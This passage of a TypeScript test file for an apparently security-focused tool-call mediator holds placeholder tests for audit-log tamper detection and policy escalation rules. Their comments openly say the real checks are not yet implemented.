      // In a production implementation with hash chains, we would verify:
      // - Each log entry has a signature
      // - Each log entry references the previous entry's signature (prevSig)
      // - If any entry is modified, the chain breaks
      // This test verifies the structure is ready for hash chain implementation
    });

    it('should detect tampering if log entries are modified (hash chain concept)', async () => {
      // This test demonstrates the concept - actual implementation would use AuditSigner
      const sessionId = 'sess_tamper';
      const tenantId = 'tenant_A';

      const request: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 900,
        method: 'tools/call',
        params: {
          name: 'SafeTool',
          arguments: { query: 'safe' },
        },
      };

      // Set up server response
      serverTransport.setResponse(900, {
        jsonrpc: '2.0',
        id: 900,
        result: { success: true },
      });

      await mediator.intercept(request, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      await new Promise(resolve => setTimeout(resolve, 10));

      const logs = await auditLogger.queryLogs({ sessionId, tenantId });
      expect(logs.length).toBeGreaterThan(0);

      // Simulate tampering (in production, this would break the hash chain)
      const originalLog = logs[logs.length - 1]; // Get most recent log
      const originalAction = originalLog.decision.action;
      
      // Create tampered log with different action
      // If original is ALLOW, change to BLOCK; if BLOCK, change to ALLOW
      const tamperedAction = originalAction === 'ALLOW' ? 'BLOCK' : 'ALLOW';
      const tamperedLog = {
        ...originalLog,
        decision: {
          ...originalLog.decision,
          action: tamperedAction as const,
        },
      };

      // In production, verifyHashChain() would detect this:
      // expect(await auditSigner.verifyHashChain([originalLog, tamperedLog])).toBe(false);
      
      // For now, verify the log structure supports hash chain verification
      expect(originalLog).toBeDefined();
      expect(tamperedLog.decision.action).not.toBe(originalLog.decision.action);
      expect(tamperedLog.decision.action).toBe(tamperedAction);
    });
  });

  describe('Policy Override Escalation', () => {
    it('should only allow escalation (ALLOW -> REDACT -> BLOCK), not de-escalation', async () => {
      // This test would require a PolicyManager that returns action overrides
      // For now, we verify the component exists and the concept
      expect(mediator).toBeDefined();
      
      // In production, PolicyManager.getResolvedPolicy() would enforce:
      // - Risk decision: ALLOW, Policy override: REDACT → Result: REDACT (escalation)
      // - Risk decision: BLOCK, Policy override: ALLOW → Result: BLOCK (no de-escalation)
      // - Risk decision: REDACT, Policy override: BLOCK → Result: BLOCK (escalation)
    });
  });
});

